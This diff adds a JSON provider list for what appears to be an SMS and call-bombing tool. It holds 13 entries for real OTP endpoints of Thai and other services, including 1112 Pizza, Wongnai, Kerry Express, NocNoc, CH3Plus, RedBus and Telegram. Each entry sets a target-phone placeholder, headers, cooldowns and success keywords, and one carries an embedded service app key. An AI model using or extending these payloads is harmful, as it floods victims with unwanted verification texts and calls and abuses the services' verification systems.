@@ -1,0 +1,275 @@
+[
+  {
+    "name": "1112 Pizza OTP",
+    "type": "sms",
+    "country": "th",
+    "method": "POST",
+    "url": "https://api2.1112.com/api/v1/otp/create",
+    "headers": {
+      "Content-Type": "application/json",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36"
+    },
+    "body_type": "json",
+    "payload": {
+      "phonenumber": "{target}",
+      "language": "th"
+    },
+    "timeout": 6.0,
+    "cooldown": 2.0,
+    "success_codes": [200, 201],
+    "success_keyword": "OK"
+  },
+  {
+    "name": "1112 Delivery OTP",
+    "type": "sms",
+    "country": "th",
+    "method": "POST",
+    "url": "https://api.1112delivery.com/api/v1/otp/create",
+    "headers": {
+      "Content-Type": "application/json",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36"
+    },
+    "body_type": "json",
+    "payload": {
+      "phonenumber": "{target}",
+      "language": "th"
+    },
+    "timeout": 6.0,
+    "cooldown": 2.0,
+    "success_codes": [200, 201],
+    "success_keyword": "OK"
+  },
+  {
+    "name": "Wongnai OTP",
+    "type": "sms",
+    "country": "th",
+    "method": "POST",
+    "url": "https://www.wongnai.com/_api/guest.json?_v=6.053&locale=th&_a=phoneLogIn",
+    "headers": {
+      "Content-Type": "application/x-www-form-urlencoded",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36"
+    },
+    "body_type": "data",
+    "payload": "phoneno={target}&retrycount=0",
+    "timeout": 6.0,
+    "cooldown": 2.0,
+    "success_codes": [200, 201],
+    "success_keyword": "phoneNumber"
+  },
+  {
+    "name": "Kex-Express Kerry OTP",
+    "type": "sms",
+    "country": "th",
+    "method": "POST",
+    "url": "https://io.th.kex-express.com/firstmile-api/v3/keweb/otp/request/{target}",
+    "headers": {
+      "Appid": "Website_Api",
+      "Appkey": "fcdf0569-c2a1-4dee-bd22-9d5361c047f2",
+      "Origin": "https://th.kex-express.com",
+      "Referer": "https://th.kex-express.com/",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36"
+    },
+    "body_type": "none",
+    "payload": {},
+    "timeout": 6.0,
+    "cooldown": 2.0,
+    "success_codes": [200, 201],
+    "success_keyword": "success"
+  },
+  {
+    "name": "NocNoc Marketplace OTP",
+    "type": "sms",
+    "country": "th",
+    "method": "POST",
+    "url": "https://nocnoc.com/authentication-service/user/OTP?b-uid=1.0.661",
+    "headers": {
+      "Content-Type": "application/json",
+      "Origin": "https://nocnoc.com",
+      "Referer": "https://nocnoc.com/",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36"
+    },
+    "body_type": "json",
+    "payload": {
+      "lang": "th",
+      "userType": "BUYER",
+      "locale": "th",
+      "orgIdfier": "scg",
+      "phone": "{target_e164}",
+      "type": "signup",
+      "otpTemplate": "buyer_signup_otp_message",
+      "userParams": {
+        "buyerName": "dec"
+      }
+    },
+    "timeout": 6.0,
+    "cooldown": 2.0,
+    "success_codes": [200, 201],
+    "success_keyword": "SUCCESS"
+  },
+  {
+    "name": "Freshket Food Supply OTP",
+    "type": "sms",
+    "country": "th",
+    "method": "POST",
+    "url": "https://api-next-version.freshket.co/baseApi/Users/RequestOtp",
+    "headers": {
+      "Content-Type": "application/json;charset=UTF-8",
+      "x-guest": "Julian",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36"
+    },
+    "body_type": "json",
+    "payload": {
+      "isDev": "false",
+      "language": "th",
+      "phone": "{target_e164}"
+    },
+    "timeout": 6.0,
+    "cooldown": 2.0,
+    "success_codes": [200, 201],
+    "success_keyword": "is_success"
+  },
+  {
+    "name": "Giztix Logistics OTP",
+    "type": "sms",
+    "country": "th",
+    "method": "POST",
+    "url": "https://api.giztix.com/graphql",
+    "headers": {
+      "Content-Type": "application/json",
+      "authorization": "null",
+      "Origin": "https://app.giztix.com",
+      "Referer": "https://app.giztix.com/",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36"
+    },
+    "body_type": "json",
+    "payload": {
+      "operationName": "OtpGeneratePhone",
+      "variables": {
+        "phone": "66{target_clean}"
+      },
+      "query": "mutation OtpGeneratePhone($phone: ID!) {\n  otpGeneratePhone(phone: $phone) {\n    ref\n    __typename\n  }\n}\n"
+    },
+    "timeout": 6.0,
+    "cooldown": 2.0,
+    "success_codes": [200, 201],
+    "success_keyword": "otpGeneratePhone"
+  },
+  {
+    "name": "CH3Plus Login OTP",
+    "type": "sms",
+    "country": "th",
+    "method": "POST",
+    "url": "https://api-sso.ch3plus.com/user/request-otp",
+    "headers": {
+      "Content-Type": "application/json",
+      "Origin": "https://accounts.ch3plus.com",
+      "Referer": "https://accounts.ch3plus.com/",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36"
+    },
+    "body_type": "json",
+    "payload": {
+      "tel": "{target}",
+      "type": "login"
+    },
+    "timeout": 6.0,
+    "cooldown": 3.0,
+    "success_codes": [200, 201],
+    "success_keyword": "OTP is requested"
+  },
+  {
+    "name": "CH3Plus Register OTP",
+    "type": "sms",
+    "country": "th",
+    "method": "POST",
+    "url": "https://api-sso.ch3plus.com/user/request-otp",
+    "headers": {
+      "Content-Type": "application/json",
+      "Origin": "https://accounts.ch3plus.com",
+      "Referer": "https://accounts.ch3plus.com/",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36"
+    },
+    "body_type": "json",
+    "payload": {
+      "tel": "{target}",
+      "type": "register"
+    },
+    "timeout": 6.0,
+    "cooldown": 3.0,
+    "success_codes": [200, 201],
+    "success_keyword": "OTP is requested"
+  },
+  {
+    "name": "RedBus Express OTP",
+    "type": "sms",
+    "country": "th",
+    "method": "GET",
+    "url": "https://m.redbus.in/api/getOtp?number={target_clean}&cc=66&whatsAppOpted=false",
+    "headers": {
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36"
+    },
+    "body_type": "none",
+    "payload": {},
+    "timeout": 6.0,
+    "cooldown": 2.0,
+    "success_codes": [200, 201],
+    "success_keyword": "OTP Sent Successfully"
+  },
+  {
+    "name": "Telegram Voice Call",
+    "type": "call",
+    "country": "th",
+    "method": "POST",
+    "url": "https://my.telegram.org/auth/send_password",
+    "preflight_url": "https://my.telegram.org/auth",
+    "headers": {
+      "Content-Type": "application/x-www-form-urlencoded",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36"
+    },
+    "body_type": "data",
+    "payload": "phone=+66{target_clean}",
+    "timeout": 8.0,
+    "cooldown": 10.0,
+    "success_codes": [200, 201],
+    "success_keyword": "random_hash"
+  },
+  {
+    "name": "Telegram Security Call",
+    "type": "call",
+    "country": "th",
+    "method": "POST",
+    "url": "https://my.telegram.org/auth/send_password",
+    "preflight_url": "https://my.telegram.org/auth",
+    "headers": {
+      "Content-Type": "application/x-www-form-urlencoded",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36"
+    },
+    "body_type": "data",
+    "payload": "phone={target_e164}",
+    "timeout": 8.0,
+    "cooldown": 10.0,
+    "success_codes": [200, 201],
+    "success_keyword": "random_hash"
+  },
+  {
+    "name": "SportPlayAuto OTP",
+    "type": "sms",
+    "country": "th",
+    "method": "POST",
+    "url": "https://gateway-sport.apija.tech/iamrobot/frontend/user/send-otp",
+    "headers": {
+      "Content-Type": "application/json",
+      "Origin": "https://sport.playauto.cloud",
+      "Referer": "https://sport.playauto.cloud/",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36"
+    },
+    "body_type": "json",
+    "payload": {
+      "tel": "{target}",
+      "prefix": "KDA"
+    },
+    "timeout": 6.0,
+    "cooldown": 3.0,
+    "success_codes": [200, 201],
+    "success_keyword": "0"
+  }
+]
